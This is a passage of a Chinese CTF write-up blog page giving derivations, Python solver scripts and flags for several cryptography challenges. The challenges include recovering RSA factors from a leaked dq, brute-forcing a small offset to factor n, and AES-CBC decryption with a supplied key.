</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">d_p</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="n">inv_a</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">            <span class="n">g</span> <span class="o">=</span> <span class="n">GCD</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">g</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">p</span> <span class="o">=</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl">                <span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">d_p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">try_recover_factor</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">BITS</span><span class="p">,</span> <span class="n">bases</span><span class="o">=</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">17</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">base_used</span><span class="p">,</span> <span class="n">d_p_found</span> <span class="o">=</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="n">q</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag: SYC{&#34;</span> <span class="o">+</span> <span class="n">flag_hash</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-21">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{644684707c540998d760975fb98a816a469ec567abe5c8004164d3ce887c6a8e}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="disclose">Disclose
</h3><h4 id="解题记录-8">解题记录
</h4><p>dq = d % (q - 1),d * e % ((p-1)<em>(q-1)) == 1
所以d * e % (q-1) == 1
又因为dq = d % (q-1)
所以e</em>dq = 1 + k*(q-1)
取任意不被 p 或 q 整除的整数 a，例如 3,5,7,&hellip;，就能得到：a**(e<em>dq) % q == a % q
代入a**(e</em>dq)
= a**(1 + k*(q-1))
= a * (a**(q-1))<strong>k
根据费马小定理a</strong>(q-1) % q == 1
因此最终a**(e<em>dq) % q == a % q
于是(a**(e</em>dq) - a) % q == 0
所以gcd(a**(e*dq) - a, n) == q</p>
<h4 id="exp-28">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">259787328713315620669972878133037988076215916550647711246939676477326421129812013679655754313165138535008411950313861029496051740521361999159396760989834909603081600363947357112748647883977394670486758972444444439142111569713941555128481912069206288996136103241520037293009874925975282333163541887307464845637591763227092634236013041271880254215362783937683868306313993128035189967091568339765295122704805004687960409586156492514826705669219883130894837499370163894909020869677997529751680238466436501721265413943262568271164547660870177889287883337700613985620882071517309593058133486504491987638053802704885406321489</span>   
</span></span><span class="line"><span class="cl"><span class="n">dq</span> <span class="o">=</span> <span class="mi">22499014253625008930376465290523079246236903672491529428949946205185543555249003236181305161565081242391920797396454563137397269152501398025721057979839815010145158362677658875505461725215023623199075647605873076372373127281663691994250233620145698675916320588215123270286378681617192723590595528629007323619</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">6370053764427872753918916672520952591890815345305784661535167250636567614044442456829951926201367031691890397266551896051506485503559355632977037940932465451673402461276283344898143212429679842407935863578100874434864110951261893629193556575965754852130079804129027545776519410420168588918897574771225807265360467679437166130735732969205196853246138265462918730868587864117597334192701298070798102481475959547503973860672351511772559847970384102048811464809463784622382282732625019306431797575127684452390281458642683831354534593808201093823305835131373576894519989150022396180064841804679779794213399320560860722616</span>    
</span></span><span class="line"><span class="cl"><span class="n">e_high</span> <span class="o">=</span> <span class="mi">1217218333594918008784773594710739821599287411350951048190189539176815103546142818696781454251773183601401149085966947779641557137128602392</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">=</span><span class="n">e_high</span><span class="o">//</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">11</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">e</span><span class="o">*</span><span class="n">dq</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span><span class="o">=</span><span class="n">gcd</span><span class="p">(</span><span class="n">A</span><span class="o">-</span><span class="n">a</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">n</span><span class="o">//</span><span class="n">q</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="easy_rsa">easy_RSA?
</h3><h4 id="解题记录-9">解题记录
</h4><p>由于文件给出了c_inner=c-inner可以恢复RSA密文c=c_inner+inner
文件还给出了p_m=p-m因此p=p_m+m。m是那个线性表达式中的整数，因此只要尝试若干小的 m 值，若 p_m + m 恰好整除 n，就可恢复 p（从而因式分解 n）</p>
<h4 id="exp-29">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">S</span> <span class="o">=</span>  <span class="p">(</span><span class="mi">34790</span><span class="p">,</span> <span class="mi">60770</span><span class="p">,</span> <span class="mi">29429</span><span class="p">,</span> <span class="mi">54388</span><span class="p">,</span> <span class="mi">22694</span><span class="p">,</span> <span class="mi">50136</span><span class="p">,</span> <span class="mi">13438</span><span class="p">,</span> <span class="mi">7932</span><span class="p">,</span> <span class="mi">46652</span><span class="p">,</span> <span class="mi">9362</span><span class="p">,</span> <span class="mi">44118</span><span class="p">,</span> <span class="mi">48359</span><span class="p">,</span> <span class="mi">50067</span><span class="p">,</span> <span class="mi">29997</span><span class="p">,</span> <span class="mi">63366</span><span class="p">,</span> <span class="mi">36090</span><span class="p">,</span> <span class="mi">7514</span><span class="p">,</span> <span class="mi">16382</span><span class="p">,</span> <span class="mi">24912</span><span class="p">,</span> <span class="mi">369</span><span class="p">,</span> <span class="mi">9261</span><span class="p">,</span> <span class="mi">30671</span><span class="p">,</span> <span class="mi">30689</span><span class="p">,</span> <span class="mi">61154</span><span class="p">,</span> <span class="mi">50897</span><span class="p">,</span> <span class="mi">58137</span><span class="p">,</span> <span class="mi">14927</span><span class="p">,</span> <span class="mi">51518</span><span class="p">,</span> <span class="mi">5782</span><span class="p">,</span> <span class="mi">3971</span><span class="p">,</span> <span class="mi">63594</span><span class="p">,</span> <span class="mi">41078</span><span class="p">,</span> <span class="mi">31477</span><span class="p">,</span> <span class="mi">56610</span><span class="p">,</span> <span class="mi">56084</span><span class="p">,</span> <span class="mi">29542</span><span class="p">,</span> <span class="mi">32843</span><span class="p">,</span> <span class="mi">22096</span><span class="p">,</span> <span class="mi">824</span><span class="p">,</span> <span class="mi">52492</span><span class="p">,</span> <span class="mi">33817</span><span class="p">,</span> <span class="mi">24167</span><span class="p">,</span> <span class="mi">38907</span><span class="p">,</span> <span class="mi">48871</span><span class="p">,</span> <span class="mi">24302</span><span class="p">,</span> <span class="mi">62133</span><span class="p">,</span> <span class="mi">60210</span><span class="p">,</span> <span class="mi">7525</span><span class="p">,</span> <span class="mi">55963</span><span class="p">,</span> <span class="mi">48512</span><span class="p">,</span> <span class="mi">16729</span><span class="p">,</span> <span class="mi">26176</span><span class="p">,</span> <span class="mi">37224</span><span class="p">,</span> <span class="mi">14899</span><span class="p">,</span> <span class="mi">11369</span><span class="p">,</span> <span class="mi">38873</span><span class="p">,</span> <span class="mi">41464</span><span class="p">,</span> <span class="mi">30501</span><span class="p">,</span> <span class="mi">23095</span><span class="p">,</span> <span class="mi">21440</span><span class="p">,</span> <span class="mi">14968</span><span class="p">,</span> <span class="mi">36710</span><span class="p">,</span> <span class="mi">15100</span><span class="p">,</span> <span class="mi">50047</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span>  <span class="p">(</span><span class="mi">16147</span><span class="p">,</span> <span class="mi">54417</span><span class="p">,</span> <span class="mi">37346</span><span class="p">,</span> <span class="mi">48225</span><span class="p">,</span> <span class="mi">25834</span><span class="p">,</span> <span class="mi">16202</span><span class="p">,</span> <span class="mi">9615</span><span class="p">,</span> <span class="mi">504</span><span class="p">,</span> <span class="mi">54090</span><span class="p">,</span> <span class="mi">24475</span><span class="p">,</span> <span class="mi">53598</span><span class="p">,</span> <span class="mi">20375</span><span class="p">,</span> <span class="mi">4188</span><span class="p">,</span> <span class="mi">42949</span><span class="p">,</span> <span class="mi">38644</span><span class="p">,</span> <span class="mi">5471</span><span class="p">,</span> <span class="mi">48340</span><span class="p">,</span> <span class="mi">49202</span><span class="p">,</span> <span class="mi">58598</span><span class="p">,</span> <span class="mi">31600</span><span class="p">,</span> <span class="mi">17902</span><span class="p">,</span> <span class="mi">22273</span><span class="p">,</span> <span class="mi">4272</span><span class="p">,</span> <span class="mi">58982</span><span class="p">,</span> <span class="mi">16813</span><span class="p">,</span> <span class="mi">41775</span><span class="p">,</span> <span class="mi">46368</span><span class="p">,</span> <span class="mi">20609</span><span class="p">,</span> <span class="mi">4350</span><span class="p">,</span> <span class="mi">16271</span><span class="p">,</span> <span class="mi">14783</span><span class="p">,</span> <span class="mi">21900</span><span class="p">,</span> <span class="mi">63534</span><span class="p">,</span> <span class="mi">6337</span><span class="p">,</span> <span class="mi">38858</span><span class="p">,</span> <span class="mi">35731</span><span class="p">,</span> <span class="mi">39772</span><span class="p">,</span> <span class="mi">52248</span><span class="p">,</span> <span class="mi">38217</span><span class="p">,</span> <span class="mi">48935</span><span class="p">,</span> <span class="mi">1408</span><span class="p">,</span> <span class="mi">50145</span><span class="p">,</span> <span class="mi">24808</span><span class="p">,</span> <span class="mi">4117</span><span class="p">,</span> <span class="mi">12887</span><span class="p">,</span> <span class="mi">13498</span><span class="p">,</span> <span class="mi">27429</span><span class="p">,</span> <span class="mi">61700</span><span class="p">,</span> <span class="mi">47565</span><span class="p">,</span> <span class="mi">44896</span><span class="p">,</span> <span class="mi">50703</span><span class="p">,</span> <span class="mi">64168</span><span class="p">,</span> <span class="mi">27170</span><span class="p">,</span> <span class="mi">31129</span><span class="p">,</span> <span class="mi">5620</span><span class="p">,</span> <span class="mi">63168</span><span class="p">,</span> <span class="mi">45776</span><span class="p">,</span> <span class="mi">13144</span><span class="p">,</span> <span class="mi">23963</span><span class="p">,</span> <span class="mi">25446</span><span class="p">,</span> <span class="mi">60607</span><span class="p">,</span> <span class="mi">17509</span><span class="p">,</span> <span class="mi">34818</span><span class="p">,</span> <span class="mi">1875</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span>  <span class="mi">2764</span>
</span></span><span class="line"><span class="cl"><span class="n">p_m</span><span class="o">=</span> <span class="mi">12332486510964011158671675941288876941680648099414795378886378613845684830972446231876321910330241399720401327967071598143881618549530749656312652927809332</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">c_inner</span> <span class="o">=</span> <span class="mi">83399431472999194690216705615169036306463958887795007046559917542746213139295638450504799784590430551922090084967974615725328386260579470125560123552483026894270772816722527064675899017519890685144620455393788325407207242732361884830126228889169785202880542117272251300802452717688849566335597550131883378114</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">122559396923126188518673248748225863862082328215893788075556473340278133079967721064738539949068231864208941120351781811847301797522502385475722537534223195433223265299092527494031447238530457784670684950341075860748519372286474800355858313799189011550620881300518596006433001049004445597176250937388576661809</span>
</span></span><span class="line"><span class="cl"><span class="n">Q</span> <span class="o">=</span> <span class="mi">17609948494254197001867062519311260077211984293151667548900416829700969294407535620672384674573058455384106178087491089816127503299076697261227000724815039612665504495756229918248399034320834393598470026243543589231473237419452687730543063603595465136115669723541948895463396554918071128531213060909364601656950027389056898604223267691455263897256898136680792549706073818306730228357683709696946839634919997675816794970587698373035672596923359143664093017904285058387254576603859313018778309521049338455162936103498885466949142273058671319832535869174839812056921940398538003527621201520818008358558845582594247420459</span>
</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span> <span class="mi">20652887190957239284631175340003902315126211938181093064207269195242550094032224965692251651673103425027250767184928851917797759012986735534298162794316194395592379533545344962294078494289760237724601340062723352085300184175255877738749851041498543752865574186669040985787587644798823596547499014922063118523650392438320527012937021768573183057529502842126637960161988353588863260221824429222676866093636690824910541149705709054550563060623762529654624849373383560043169934394338959338517866931347066483777887082048559999731906556171653815355183514550470420842104873391074567329742472001229790402635829640092130822763</span>
</span></span><span class="line"><span class="cl"><span class="n">q1</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">inner</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">s</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">S</span><span class="p">))</span> <span class="o">%</span> <span class="n">q1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">c_inner</span> <span class="o">+</span> <span class="n">inner</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="n">m_found</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2_000_000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_cand</span> <span class="o">=</span> <span class="n">p_m</span> <span class="o">+</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="n">p_cand</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">p_cand</span>
</span></span><span class="line"><span class="cl">        <span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">        <span class="n">m_found</span> <span class="o">=</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Found! m =&#34;</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] p =&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] q =&#34;</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m_flag</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-22">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{y0u_sh0u1d_learn_a_l0t_a0bout_LLL}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="s_box">S_box
</h3><p>是个AES,key也给了，直接nc之后复制一下数据，套模板解</p>
<h4 id="exp-30">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key1</span> <span class="o">=</span> <span class="mi">18418224610639320248870372935080282239</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipher_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;)</span><span class="se">\xf3</span><span class="s1">&lt;</span><span class="se">\xf3</span><span class="s1">T</span><span class="se">\x18\xfd</span><span class="s1">21</span><span class="se">\xa6</span><span class="s1">w</span><span class="se">\xcf\x85</span><span class="s1">S</span><span class="se">\x97</span><span class="s1">m</span><span class="se">\x17\xab\x9f</span><span class="s1">?q</span><span class="se">\x85\xc0\r\xd3\x02\n\x98</span><span class="s1">0</span><span class="se">\x06\xaf\xe4</span><span class="s1">RX</span><span class="se">\x7f</span><span class="s1">l</span><span class="se">\x18</span><span class="s1">eV5</span><span class="se">\x07\xdb\x1f\x18</span><span class="s1">S</span><span class="se">\x17</span><span class="s1">5n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">iv_bytes</span>     <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n\xa4\xc7\x1d\x16\xf5\xa7\xcb\xf8\x8a\x0b</span><span class="s2">K</span><span class="se">\xd7</span><span class="s2">&#39;</span><span class="se">\xa9</span><span class="s2">F&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key_bytes</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plain</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-23">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{SS_B0xx_I1s_ver1y_Differe1c999c}
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/wp/">WP</a>
        
            <a href="/tags/ctf/">CTF</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Converter258
    </section>
    

</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
